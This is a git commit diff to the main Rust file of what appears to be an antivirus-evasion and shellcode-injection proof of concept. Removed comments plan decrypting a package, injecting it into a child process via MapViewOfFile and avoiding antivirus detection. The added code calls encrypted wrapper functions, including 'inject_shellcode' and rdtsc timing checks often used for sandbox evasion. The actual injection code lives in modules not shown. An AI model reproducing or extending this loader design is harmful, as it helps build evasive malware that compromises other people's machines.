1bd6dfd15cfe53aa5fc09ccd33e91f5500c60eb3
Chalk <61552486+zwsyscall@users.noreply.github.com>
2025-04-21 01:27:05 +0300

    Add POC main

--- src/main.rs
+++ src/main.rs
@@ -1,8 +1,20 @@
-mod evasion;
+mod crypto;
+mod encrypted_functions;
+pub mod evasion;
+pub mod keys;
 
-fn main() {
-    // Decrypt the package
-    // Ensure it matches some checksum
-    // Create a child with mapviewoffile and inject into it :^)
-    // Now, we have to somehow avoid antivirus software while doing this
+fn main() -> anyhow::Result<()> {
+    // Performance test
+    let rdtsc_1 = encrypted_call!(encrypted_functions::rdtsc,);
+    println!("[+] rdtsc: {}", rdtsc_1);
+    let rdtsc_2 = encrypted_call!(encrypted_functions::rdtsc,);
+    println!("[+] diff: {}", rdtsc_2 - rdtsc_1);
+
+    // Longer function
+    encrypted_call!(encrypted_functions::inject_shellcode,)?;
+
+    // Input and output
+    let function_output = encrypted_call!(encrypted_functions::function_input_output_example, "bar");
+    println!("[+] Function output: {}", function_output);
+    Ok(())
 }
